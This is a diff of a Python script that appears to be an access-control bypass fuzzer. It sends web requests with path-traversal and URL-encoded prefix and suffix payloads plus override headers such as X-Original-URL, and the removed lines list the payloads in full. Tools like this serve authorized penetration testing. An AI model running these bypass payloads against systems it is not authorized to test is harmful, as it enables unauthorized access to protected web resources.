@@ -1,5 +1,5 @@
 from urllib.parse import urlparse, urlunparse
-import urllib, sys, argparse, requests
+import urllib, sys, os, argparse, requests
 requests.packages.urllib3.disable_warnings()
 
 parser = argparse.ArgumentParser(
@@ -37,41 +37,41 @@ headers = {
     "Connection": "close",
     "Upgrade-Insecure-Requests": "1"}
 
-prefix_payloads = [
-    '%20', '//', '/;/', '/;//', '/./', '/.//', '/.;/', '/.;//', '/../', '/..',
-    '/..//', '/..;/', '/..;//', '/../../', '/..//../', '/../..//', '//../../',
-    '/../../../', '/../..//../', '/..//../../', '/../../..//', '%2f%2f',
-    '%2f/', '/%2f', '/%3b/', '%2f%3b%2f', '%2f%3b%2f%2f', '/%2e/', '/%2e//',
-    '/%2e%3b/', '/%2e%3b//', '/%2e%2e/', '/%2e%2e', '/%2e%2e%3b/', '/%2e%2f/',
-    '/%2e%2e%2f/', '/%252e%253b/', '/%252e%252e%253b/', '%252f%252f', '%252f/',
-    '/%252f', '/%252e/', '/%252e%252f/', '/%252e%252e%252f/']
+scriptDir = os.path.dirname(__file__)
+payloads_file = os.path.join(scriptDir, 'payloads.txt')
 
-suffix_payloads = [
-    ';', '/', '%2f', '/./', '/%2e/', '/../', '/%2e%2e/', '.html', '.json', '#',
-    '/%20', '%20']
+with open(payloads_file, 'r') as pf:
+    payloads = pf.read().splitlines()
 
-
-def setup_payloads(parsed, pathPieces, query):
+def setup_payloads(parsed, pathPieces, payloads):
+    paths = []
     urls = []
-    # Set up paths with prefix payloads
     for i, piece in enumerate(pathPieces):
-        for payload in prefix_payloads:
-            parsed = parsed._replace(
-                path=path.replace(
-                    '/{}'.format(piece),  # original path
-                    "{}{}".format(payload, piece)),  # add payload
-                query=query)
-            urls.append(urlunparse(parsed))
+        last = pathPieces[len(pathPieces)-1]
+        for payload in payloads:
+            # prefix payload
+            pathPieces[i] = "{}{}".format(payload, piece)
+            paths.append('/'.join(pathPieces))
+            pathPieces[i] = piece
 
-    # Set up paths with suffix payloads
-    for i, piece in enumerate(pathPieces):
-        for payload in suffix_payloads:
-            parsed = parsed._replace(
-                path=path.replace(
-                    piece,  # original path
-                    "{}{}".format(piece, payload)),  # add payload
-                query=query)
-            urls.append(urlunparse(parsed))
+            # suffix payload
+            pathPieces[i] = "{}{}".format(piece, payload)
+            paths.append('/'.join(pathPieces))
+            pathPieces[i] = piece
+
+            # prefix on first param, suffix on last param
+            pathPieces[len(pathPieces)-1] = "{}{}".format(piece, payload)
+            pathPieces[i] = "{}{}".format(payload, piece)
+            paths.append('/'.join(pathPieces))
+            pathPieces[i] = piece
+            pathPieces[len(pathPieces)-1] = last
+
+    # sort and dedupe
+    paths = sorted(set(paths))
+
+    for p in paths:
+        parsed = parsed._replace(path=p)
+        urls.append(urlunparse(parsed))
 
     return urls
 
@@ -140,12 +140,15 @@ if args.hl:
 else:
     hide["hl"] = ''
 
-url = args.url  # https://target.com/some/path?param1=1&param2=2
+# https://example.com/test/test2?p1=1&p2=2
+url = args.url
+# ParseResult(scheme='https', netloc='example.com', path='/test/test2',
+# params='', query='p1=1&p2=2', fragment='')
 parsed = urlparse(url)
-path = parsed.path  # /some/path
-query = parsed.query  # param1=1param2=2
-pathPieces = ' '.join(parsed.path.split('/')).split()  # ['some', 'path']
-url_payloads = setup_payloads(parsed, pathPieces, query)
+path = parsed.path  # /test/test2
+query = parsed.query  # p1=1p2=2
+pathPieces = ' '.join(parsed.path.split('/')).split()  # ['test', 'test2']
+url_payloads = setup_payloads(parsed, pathPieces, payloads)
 
 header_payloads = {
     "X-Original-URL": path,
@@ -164,7 +167,7 @@ s = requests.Session()
 s.proxies = proxies
 for url in url_payloads:
     resp_code, resp_text, path = send_url_payloads(s, url, cookies, proxies)
-    MSG = "Response code: {}   Response length: {}   Path: {}\n".format(resp_code, len(resp_text), path)
+    MSG = "Response code: {}\tResponse length: {}\tPath: {}".format(resp_code, len(resp_text), path)
 
     if hide["hc"] != str(resp_code) and hide["hl"] != str(len(resp_text)):
         print(MSG)
